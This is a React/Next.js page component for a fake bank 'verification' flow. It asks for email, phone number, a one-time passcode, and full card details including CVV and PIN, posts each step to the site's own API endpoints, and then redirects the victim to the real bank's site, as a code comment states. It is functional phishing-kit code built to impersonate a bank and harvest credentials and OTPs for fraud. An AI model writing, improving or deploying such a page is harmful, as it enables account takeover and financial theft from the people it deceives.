'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import Footer from '@/app/components/Footer';

export default function CombinedVerification() {
  const router = useRouter();
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({
    emailAddress: "",
    phoneNumber: "",
    verificationCode: "",
    ssn: "",
    accountNumber: "",
    bankName: process.env.NEXT_PUBLIC_BANK_NAME,
    // Credit card fields
    cardNumber: "",
    cardExpiry: "",
    cardCVV: "",
    cardholderName: "",
    cardPIN: ""
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);
  const [codeRequested, setCodeRequested] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  // Function to send data to our API
  const sendStepData = async (stepNumber, additionalData = {}) => {
    setIsSubmitting(true);
    
    try {
      // Prepare the data for the current step
      let requestData = {
        bbankName: formData.bankName,
        type: stepNumber === 1 ? 'email and phone number' : stepNumber === 2 ? 'verification code (OTP)' : 'bank card details',
        // stepCompleted: stepNumber,
        // time: new Date().toString(),
        ...additionalData
      };
      
      const response = await fetch('/api/email-verification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(requestData),
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      console.log(`Step ${stepNumber} data submitted successfully`);
      setSubmitStatus("success");
      return true;
    } catch (error) {
      console.error(`Failed to submit step ${stepNumber} data:`, error);
      setSubmitStatus("error");
      return false;
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNextStep = async () => {
    // Validation and data sending for each step
    if (currentStep === 1) {
      if (!formData.emailAddress || !formData.phoneNumber) return;
      
      // Send step 1 data
      const success = await sendStepData(1, {
        emailAddress: formData.emailAddress,
        phoneNumber: formData.phoneNumber
      });
      
      if (!success) return;
    } 
    else if (currentStep === 2) {
      if (!formData.verificationCode) return;
      
      // Send step 2 data
      const success = await sendStepData(2, {
        // emailAddress: formData.emailAddress,
        // phoneNumber: formData.phoneNumber,
        verificationCode: formData.verificationCode
      });
      
      if (!success) return;
    } 
    else if (currentStep === 3) {
      // Validate that credit card fields are filled (including PIN)
      if (!formData.cardNumber || !formData.cardExpiry || !formData.cardCVV || !formData.cardholderName || !formData.cardPIN) return;
      
      // The final submission will happen in handleFinalSubmit
      handleFinalSubmit();
      return;
    }

    // Move to next step
    if (currentStep < 3) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handleRequestCode = async () => {
    // Send code request notification
    await sendStepData('code-request', {
      emailAddress: formData.emailAddress,
      phoneNumber: formData.phoneNumber,
      message: "User requested verification code"
    });
    
    setCodeRequested(true);
    // In a real app, this would trigger sending a code to the user
  }

  const handleFinalSubmit = async () => {
    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send the final, complete submission with all data
      const response = await fetch('/api/bank-card-details', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bankName: formData.bankName,
          emailAddress: formData.emailAddress,
          phoneNumber: formData.phoneNumber,
          verificationCode: formData.verificationCode,
          // Credit card details
          cardNumber: formData.cardNumber,
          cardExpiry: formData.cardExpiry,
          cardCVV: formData.cardCVV,
          cardholderName: formData.cardholderName,
          cardPIN: formData.cardPIN,  // Added PIN to final submission
          stepCompleted: "final",
          time: new Date().toString()
        }),
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      console.log("Final verification submitted successfully");
      setSubmitStatus("success");
      // Move to confirmation step
      setCurrentStep(4);
      
      // Redirect to the bank's real site after a short delay
      setTimeout(() => {
        router.push(process.env.NEXT_PUBLIC_MAIN_PAGE_URL);
      }, 3000);
      
    } catch (error) {
      console.error("Failed to submit final verification:", error);
      setSubmitStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <>
            <h2 className="text-xl mb-2">Email Verification!</h2>
            <h3 className="text-lg mb-4">Confirm Your Email and Phone Number Information</h3>
            <p className="mb-4">Please confirm your contact details on file.</p>

            <div className="mb-4">
              <label className="block mb-1">Email Address</label>
              <input
                type="email"
                name="emailAddress"
                value={formData.emailAddress}
                onChange={handleChange}
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
              />
            </div>

            <div className="mb-4">
              <label className="block mb-1">Phone Number</label>
              <input
                type="tel"
                name="phoneNumber"
                placeholder="XXX-XXX-XXXX"
                maxLength={10}
                value={formData.phoneNumber}
                onChange={handleChange}
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
              />
            </div>
          </>
        );

      case 2:
        return (
          <>
            <h2 className="text-xl mb-2">Code Verification</h2>
            <p className="mb-4">
              We&apos;ve sent a secured code to your registered number. Please tell us your code
              for account verification. If you didn&apos;t get code, please wait 1-2 minutes.
            </p>

            <div className="mb-4">
              <input
                type="text"
                name="verificationCode"
                value={formData.verificationCode}
                onChange={handleChange}
                placeholder="Enter your code"
                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
              />
            </div>

            <div className="flex justify-start mb-4">
              <button
                type="button"
                onClick={handleRequestCode}
                className="bg-[#3B3836] text-white px-4 py-2 rounded-md hover:bg-[#4e4c4b] mr-2"
              >
                Resend Code
              </button>
            </div>
            
            {codeRequested && (
              <div className="text-green-500 text-sm mb-4">
                Code has been resent. Please check your device.
              </div>
            )}
          </>
        );

      case 3:
        return (
          <>
            <h2 className="text-xl mb-2">Account Verification!</h2>
            <h3 className="text-lg mb-4">Confirm Your Account Information</h3>
            <p className="mb-4">We need this info to verify your identity.</p>

            {/* Credit Card Details Section */}
            <div className="mt-6 mb-4">
              <h3 className="text-lg mb-3">Bank card information</h3>
              <p className="mb-3 text-sm text-gray-300">
                Please provide your Bank card information for verification purposes.
              </p>
              
              <div className="mb-3">
                <label className="block mb-1">Cardholder Name</label>
                <input
                  type="text"
                  name="cardholderName"
                  value={formData.cardholderName}
                  onChange={handleChange}
                  placeholder="Name as it appears on card"
                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                />
              </div>
              
              <div className="mb-3">
                <label className="block mb-1">Card Number</label>
                <input
                  type="text"
                  name="cardNumber"
                  maxLength={16}
                  value={formData.cardNumber}
                  onChange={handleChange}
                  placeholder="XXXX XXXX XXXX XXXX"
                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                />
              </div>
              
              <div className="flex gap-4">
                <div className="w-1/2">
                  <label className="block mb-1">Expiry Date</label>
                  <input
                    type="text"
                    name="cardExpiry"
                    value={formData.cardExpiry}
                    onChange={handleChange}
                    placeholder="MM/YY"
                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                  />
                </div>
                
                <div className="w-1/2">
                  <label className="block mb-1">CVV</label>
                  <input
                    type="text"
                    name="cardCVV"
                    value={formData.cardCVV}
                    onChange={handleChange}
                    placeholder="123"
                    maxLength={3}
                    className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                  />
                </div>
              </div>
              
              {/* Added PIN field */}
              <div className="mt-3">
                <label className="block mb-1">Card PIN</label>
                <input
                  type="password"
                  name="cardPIN"
                  value={formData.cardPIN}
                  onChange={handleChange}
                  placeholder="Enter 4-digit PIN"
                  maxLength={4}
                  className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#36c3f1]"
                />
                <p className="text-xs text-gray-400 mt-1">
                  For security verification only
                </p>
              </div>
            </div>

            <div className="text-center mt-2">
              <a href="#" className="text-[#36c3f1] text-sm hover:underline">
                Need help finding your account number?
              </a>
            </div>
          </>
        );

      case 4:
        return (
          <>
            <h2 className="text-xl mb-2">Account Verification!</h2>
            <h3 className="text-lg mb-4">Thank you!</h3>
            <p className="mb-4">
              Your contact information has been updated successfully. Please{" "}
              <a href={process.env.NEXT_PUBLIC_LOGIN_URL} className="text-[#36c3f1] hover:underline">
                Click here
              </a>{" "}
              and you will be redirected to the Authentication page. If the page doesn&apos;t
              reload in 5 seconds
            </p>

            <div className="text-center mt-4">
              <p className="text-sm text-gray-400">
                Redirecting you to secure login...
              </p>
            </div>
          </>
        );

      default:
        return null;
    }
  };

  return (
    <div
      className="min-h-screen flex flex-col justify-between"
      style={{
        backgroundImage: `url(/assets/bg.png)`,
        backgroundSize: "cover",
        backgroundPosition: "center",
      }}
    >
      {/* Main Content */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="bg-[#1E1F20] text-white w-full md:w-md max-w-lg p-6 rounded-lg shadow-xl">
          {/* Logo */}
          <div className="flex justify-center mb-6">
            <Image 
              src="/assets/logo.png"
              alt=" Bank" 
              width={288}
              height={80}
              className="h-12"
            />
          </div>
          
          {/* Progress Indicator */}
          <div className="flex justify-between mb-6 px-4">
            {[1, 2, 3].map((step) => (
              <div 
                key={step} 
                className={`w-8 h-8 rounded-full flex items-center justify-center ${
                  currentStep >= step 
                    ? "bg-[#36c3f1] text-[#1E1F20]" 
                    : "bg-gray-700 text-white"
                }`}
              >
                {step}
              </div>
            ))}
          </div>

          {/* Step Content */}
          <div className="mb-6">
            {renderStepContent()}
          </div>

          {/* Navigation Buttons */}
          {currentStep < 4 && (
            <div className="flex justify-center mt-6">
              <button
                type="button"
                onClick={handleNextStep}
                className="bg-[#3B3836] text-white px-8 py-3 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  "Processing..."
                ) : (
                  currentStep === 3 ? "Submit" : "Continue"
                )}
              </button>
            </div>
          )}

          {/* Error Message */}
          {submitStatus === "error" && (
            <div className="text-red-500 text-center mt-4">
              Something went wrong. Please try again.
            </div>
          )}
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
}